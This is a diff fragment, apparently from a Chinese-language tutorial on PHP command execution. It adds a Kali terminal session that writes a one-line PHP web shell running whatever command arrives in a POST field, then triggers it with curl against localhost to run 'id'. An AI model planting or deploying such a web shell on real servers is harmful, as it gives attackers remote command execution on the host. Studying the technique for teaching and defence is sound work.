@@ -20,6 +20,16 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+```
+root@kali:/tmp# cat /var/www/html/9.php
+<?php
+echo `$_POST[1]`;
+?>
+root@kali:/tmp# curl 127.0.0.1/9.php --data "1=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+root@kali:/tmp# 
+```
+
 
 无回显的`popen()`
 ```
